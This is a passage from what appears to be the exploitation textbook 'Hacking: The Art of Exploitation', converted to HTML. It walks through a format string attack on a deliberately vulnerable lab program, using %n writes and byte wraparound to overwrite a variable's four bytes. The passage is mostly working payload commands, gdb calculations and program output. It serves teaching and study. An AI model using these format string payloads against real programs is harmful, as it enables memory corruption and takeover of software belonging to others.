src="Image_545.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ sed -e &#39;s/72;/72, next_val = 0x11111111;/;/@/{h;s/test/next/g;x;G}&#39; fmt_vuln.c &gt; fmt_vuln2.c</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ diff fmt_vuln.c fmt_vuln2.c 7c7</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&lt;  static int test_val = -72;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">---</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; static int test_val = -72, next_val = 0x11111111; 27a28</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">&gt; printf(&quot;[*] next_val @ 0x%08x = %d 0x%08x\n&quot;, &amp;next_val, next_val, next_val); reader@hacking:~/booksrc $ gcc -o fmt_vuln2 fmt_vuln2.c reader@hacking:~/booksrc $ ./fmt_vuln2 test</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The right way:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">test</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">test</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x080497b4 = -72 0xffffffb8</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[*] next_val @ 0x080497b8 = 286331153 0x11111111 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_546.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">As the preceding output shows, the code change has also moved the address of the <span class="s31">test_val </span>variable. However, <span class="s31">next_val </span>is shown to be adjacent to it. For practice, let’s write an address into the variable <span class="s31">test_val </span>again, using the new address.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Last time, a very convenient address of <span class="s31">0xddccbbaa </span>was used. Since each byte is greater than the previous byte, it’s easy to increment the byte counter for each byte. But what if an address like <span class="s31">0x0806abcd </span>is used? With this address, the first byte of <span class="s31">0xCD </span>is easy to write using the <span class="s31">%n </span>format parameter by output- ting 205 bytes total bytes with a field width of 161. But then the next byte to be written is <span class="s31">0xAB</span>, which would need to have 171 bytes outputted. It’s easy to increment the byte counter for the <span class="s31">%n </span>format parameter, but it’s impossible to subtract from it.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_547.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln2 AAAA%x%x%x%x The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">AAAA%x%x%x%x</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">AAAAbffff3d0b7fe75fc041414141</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x080497f4 = -72 0xffffffb8</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] next_val @ 0x080497f8 = 286331153 0x11111111 reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p 0xcd - 5&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 200</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\ x97\x04\x08JUNK\xf7\x97\x04\x08&quot;)%x%x%8x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??%x%x%8x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??bffff3c0b7fe75fc   0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = -72 0xffffffb8</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf &quot;\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\ x97\x04\x08JUNK\xf7\x97\x04\x08&quot;)%x%x%8x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??%x%x%8x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??bffff3c0b7fe75fc   0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x080497f4 = 52 0x00000034</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] next_val @ 0x080497f8 = 286331153 0x11111111 reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p 0xcd - 52 + 8&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 161</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf &quot;\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\ x97\x04\x08JUNK\xf7\x97\x04\x08&quot;)%x%x%161x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??%x%x%161x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??bffff3b0b7fe75fc</p><p class="s31" style="padding-left: 185pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x080497f4 = 205 0x000000cd</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[*] next_val @ 0x080497f8 = 286331153 0x11111111 reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p 0xab - 0xcd&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">$1 = -34</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_548.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">Instead of trying to subtract 34 from 205, the least significant byte is just wrapped around to <span class="s31">0x1AB </span>by adding 222 to 205 to produce 427, which is the decimal representation of <span class="s31">0x1AB</span>. This technique can be used to wrap around again and set the least significant byte to <span class="s31">0x06 </span>for the third write.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_549.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p 0x1ab - 0xcd&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 222</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p /d 0x1ab&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 427</p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf &quot;\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\ x97\x04\x08JUNK\xf7\x97\x04\x08&quot;)%x%x%161x%n%222x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??bffff3b0b7fe75fc</p><p class="s31" style="text-indent: 0pt;line-height: 9pt;text-align: right;">0</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x080497f4 = 109517 0x0001abcd [*] next_val @ 0x080497f8 = 286331136 0x11111100</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">4b4e554a</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p 0x06 - 0xab&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = -165</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p 0x106 - 0xab&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 91</p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf &quot;\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\ x97\x04\x08JUNK\xf7\x97\x04\x08&quot;)%x%x%161x%n%222x%n%91x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??bffff3b0b7fe75fc</p><p class="s31" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0</p><p class="s31" style="padding-left: 86pt;text-indent: 0pt;line-height: 10pt;text-align: center;">4b4e554a</p><p class="s31" style="padding-top: 2pt;padding-left: 134pt;text-indent: 0pt;text-align: left;">4b4e554a</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">[*] test_val @ 0x080497f4 = 33991629 0x0206abcd [*] next_val @ 0x080497f8 = 286326784 0x11110000 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_550.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">With each write, bytes of the <span class="s31">next_val </span>variable, adjacent to <span class="s31">test_val</span>, are being overwritten. The wraparound technique seems to be working fine, but a slight problem manifests itself as the final byte is attempted.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_551.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p 0x08 - 0x06&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 2</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf &quot;\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\ x97\x04\x08JUNK\xf7\x97\x04\x08&quot;)%x%x%161x%n%222x%n%91x%n%2x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n%2x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">??JUNK??JUNK??JUNK??bffff3a0b7fe75fc</p><p class="s31" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0</p><p class="s31" style="padding-left: 86pt;text-indent: 0pt;line-height: 9pt;text-align: center;">4b4e554a</p><p class="s31" style="padding-left: 86pt;text-indent: 0pt;line-height: 10pt;text-align: center;">4b4e554a4b4e554a</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: justify;">[*] test_val @ 0x080497f4 = 235318221 0x0e06abcd [*] next_val @ 0x080497f8 = 285212674 0x11000002 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_552.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">What happened here? The difference between <span class="s31">0x06 </span>and <span class="s31">0x08 </span>is only two, but eight bytes are output, resulting in the byte <span class="s31">0x0e </span>being written by the <span class="s31">%n </span>format parameter, instead. This is because the field width option for the</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span class="s31">%x </span>format parameter is only a <span class="s27">minimum </span>field width, and eight bytes of data were output. This problem can be alleviated by simply wrapping around again; however, it’s good to know the limitations of the field width option.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_553.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p 0x108 - 0x06&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 258</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf &quot;\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\ x97\x04\x08JUNK\xf7\x97\x04\x08&quot;)%x%x%161x%n%222x%n%91x%n%258x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n%258x%n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">??JUNK??JUNK??JUNK??bffff3a0b7fe75fc</p><p class="s31" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 134pt;text-indent: 0pt;text-align: left;">4b4e554a</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: justify;">[*] test_val @ 0x080497f4 = 134654925 0x0806abcd [*] next_val @ 0x080497f8 = 285212675 0x11000003 reader@hacking:~/booksrc $</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 9pt;text-align: left;">4b4e554a</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 7pt;padding-left: 15pt;text-indent: 0pt;text-align: left;">4b4e554a</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_554.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Just like before, the appropriate addresses and junk data are put in the beginning of the format string, and the least significant byte is controlled for four write operations to overwrite all four bytes of the variable <span class="s31">test_val</span>. Any value subtractions to the least significant byte can be accomplished by wrap- ping the byte around. Also, any additions less than eight may need to be wrapped around in a similar fashion.</p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part64.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part66.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
